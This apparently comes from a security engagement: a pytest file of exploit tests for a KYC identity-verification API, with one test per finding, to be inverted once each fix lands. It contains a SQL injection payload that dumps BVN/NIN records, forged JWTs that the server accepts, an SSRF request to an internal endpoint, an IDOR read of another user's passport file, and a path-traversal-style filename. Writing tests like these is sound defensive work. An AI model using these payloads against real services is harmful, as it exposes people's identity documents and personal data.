"""Exploit tests — one per V-APP finding (and variants) in kyc-api.

These are written against the INHERITED, unpatched code and are expected to
PASS right now (because the exploit succeeds). Each will be inverted (or
replaced by a regression test proving the exploit now fails) in the commit
that closes the corresponding GitHub issue.

S3 calls are mocked with moto (requirements-dev.txt) since there is no AWS
account for this engagement right now; the real bucket will be exercised
again once Week 2's Terraform-managed S3 bucket exists.

Run inside the kyc-api container:

    docker compose exec kyc-api pytest tests/test_vulnerabilities.py -v
"""
import io
import os
import uuid

import pytest
from moto import mock_s3

from app.main import create_app

KYC_BUCKET = os.environ.get("KYC_BUCKET", "sentinelpay-kyc-documents")
AWS_REGION = os.environ.get("AWS_REGION", "af-south-1")


@pytest.fixture
def client():
    app = create_app()
    app.config["TESTING"] = True
    return app.test_client()


@pytest.fixture
def s3_bucket():
    """A moto-mocked S3 with the KYC bucket pre-created, standing in for the
    real bucket until Week 2's Terraform provisions one."""
    with mock_s3():
        import boto3

        s3 = boto3.client(
            "s3",
            region_name=AWS_REGION,
            aws_access_key_id="test",
            aws_secret_access_key="test",
        )
        s3.create_bucket(Bucket=KYC_BUCKET, CreateBucketConfiguration={"LocationConstraint": AWS_REGION})
        yield s3


def forged_token(user_id=1, role="merchant"):
    """kyc-api shares payments-api's broken decode_token (verify_signature is
    always False), so any client can mint a 'valid' token without the secret."""
    import jwt

    token = jwt.encode({"user_id": user_id, "role": role}, "wrong-secret-attacker-does-not-know", algorithm="HS256")
    return token.decode() if isinstance(token, bytes) else token


def auth_header(token):
    return {"Authorization": f"Bearer {token}"}


# --------------------------------------------------------------------------
# V-APP-01 (variant) — SQL injection in BVN/NIN lookup
# --------------------------------------------------------------------------
def test_v_app_01_sql_injection_in_kyc_lookup(client):
    token = forged_token()

    baseline = client.get("/v1/verify/lookup", query_string={"bvn": "00000000000"}, headers=auth_header(token))
    assert baseline.status_code == 200
    assert baseline.get_json() == []

    injected = client.get(
        "/v1/verify/lookup",
        query_string={"bvn": "00000000000' OR '1'='1"},
        headers=auth_header(token),
    )
    assert injected.status_code == 200
    rows = injected.get_json()
    assert len(rows) > 0, "expected the injected OR clause to leak every kyc_records row"
    # Confirms this is a genuine data leak, not an empty-but-200 response: real
    # BVNs/NINs belonging to other users come back.
    assert any(r.get("bvn") and r["bvn"] != "00000000000" for r in rows)


# --------------------------------------------------------------------------
# V-APP-02 (shared) — broken JWT validation, same bug as payments-api
# --------------------------------------------------------------------------
def test_v_app_02_forged_token_is_accepted(client):
    """kyc-api duplicates payments-api's decode_token verbatim. A token
    signed with an attacker-chosen secret still authenticates."""
    token = forged_token(user_id=999, role="admin")
    resp = client.get("/v1/verify/lookup", query_string={"nin": "00000000000"}, headers=auth_header(token))
    assert resp.status_code == 200  # not 401 — the forged token was accepted


# --------------------------------------------------------------------------
# V-APP-04 (variant) — SSRF via client-supplied BVN provider URL
# --------------------------------------------------------------------------
def test_v_app_04_ssrf_via_bvn_provider(client, monkeypatch):
    """The 'provider' field lets the caller redirect the server-side POST
    anywhere, including services never meant to be reachable from outside
    their own trust boundary. Demonstrated here against payments-api's
    internal health endpoint, which a KYC caller has no legitimate reason
    to reach."""
    # verify_bvn always POSTs to `provider`, so the target has to accept POST.
    # payments-api's own OTP endpoint does and needs no auth — a KYC caller
    # has no legitimate reason to be able to reach it at all.
    resp = client.post(
        "/v1/verify/bvn",
        json={"bvn": "12345678901", "provider": "http://payments-api:8001/v1/auth/otp"},
        headers=auth_header(forged_token()),
    )
    assert resp.status_code == 200, resp.get_json()
    body = resp.get_json()
    assert '"status": "sent"' in body["provider_response"], (
        "expected the server to have fetched an arbitrary internal URL and "
        "returned its response body, proving no destination allow-list exists"
    )


# --------------------------------------------------------------------------
# V-APP-03 (variant) — IDOR on KYC documents
# --------------------------------------------------------------------------
def test_v_app_03_idor_reads_another_users_document(client, s3_bucket):
    victim_token = forged_token(user_id=101)
    attacker_token = forged_token(user_id=202)

    upload = client.post(
        "/v1/documents/upload",
        data={"file": (io.BytesIO(b"victim passport bytes"), "passport.jpg")},
        content_type="multipart/form-data",
        headers=auth_header(victim_token),
    )
    assert upload.status_code == 201, upload.get_json()
    key = upload.get_json()["key"]
    assert key.startswith("users/101/")

    # The attacker only has to guess/know the predictable users/<id>/<filename>
    # key; there is no check that the caller owns the document.
    fetch = client.get(f"/v1/documents/{key}", headers=auth_header(attacker_token))
    assert fetch.status_code == 200
    assert fetch.data == b"victim passport bytes"


def test_kyc_upload_sets_public_read_acl(client, s3_bucket):
    """Every uploaded KYC document — passports, utility bills — is given a
    public-read ACL, independent of the IDOR above."""
    upload = client.post(
        "/v1/documents/upload",
        data={"file": (io.BytesIO(b"some id document"), "id.jpg")},
        content_type="multipart/form-data",
        headers=auth_header(forged_token(user_id=303)),
    )
    assert upload.status_code == 201
    key = upload.get_json()["key"]

    acl = s3_bucket.get_object_acl(Bucket=KYC_BUCKET, Key=key)
    all_users_grant = [
        g for g in acl["Grants"]
        if g["Grantee"].get("URI", "").endswith("/groups/global/AllUsers")
    ]
    assert all_users_grant, "expected the AllUsers group to have been granted access"
    assert all_users_grant[0]["Permission"] == "READ"


def test_kyc_upload_filename_has_no_sanitisation_or_collision_protection(client, s3_bucket):
    """The client-supplied filename is used verbatim in the S3 key with no
    sanitisation and no collision check.

    Note on scope: S3 keys are flat strings, not filesystem paths, so a
    literal '../' in the filename does NOT let an upload escape another
    user's users/<id>/ prefix the way it would against a real filesystem —
    an earlier draft of this test incorrectly assumed otherwise. The real,
    demonstrable impact of the missing sanitisation is (a) no restriction on
    '/' in the filename, so a single upload can create arbitrarily deep
    nested keys under the caller's own prefix, and (b) no uniqueness check,
    so a second upload with the same filename silently overwrites the first
    with no versioning or warning — evidence an attacker who also forges a
    victim's user_id via V-APP-02 could use to destroy the victim's
    previously-submitted KYC document without the victim ever being asked."""
    token = forged_token(user_id=505)

    first = client.post(
        "/v1/documents/upload",
        data={"file": (io.BytesIO(b"first version of the document"), "passport.jpg")},
        content_type="multipart/form-data",
        headers=auth_header(token),
    )
    assert first.status_code == 201
    key = first.get_json()["key"]

    second = client.post(
        "/v1/documents/upload",
        data={"file": (io.BytesIO(b"silently overwritten, no versioning"), "passport.jpg")},
        content_type="multipart/form-data",
        headers=auth_header(token),
    )
    assert second.status_code == 201
    assert second.get_json()["key"] == key, "same filename collided onto the same key with no warning"

    stored = s3_bucket.get_object(Bucket=KYC_BUCKET, Key=key)
    assert stored["Body"].read() == b"silently overwritten, no versioning"

    traversal_filename = "../../etc/weird-but-not-cross-tenant.jpg"
    nested = client.post(
        "/v1/documents/upload",
        data={"file": (io.BytesIO(b"nested key from unsanitised filename"), traversal_filename)},
        content_type="multipart/form-data",
        headers=auth_header(token),
    )
    assert nested.status_code == 201
    nested_key = nested.get_json()["key"]
    assert nested_key == f"users/505/{traversal_filename}", (
        "filename passed through unsanitised into a literal (if odd-looking) S3 key"
    )
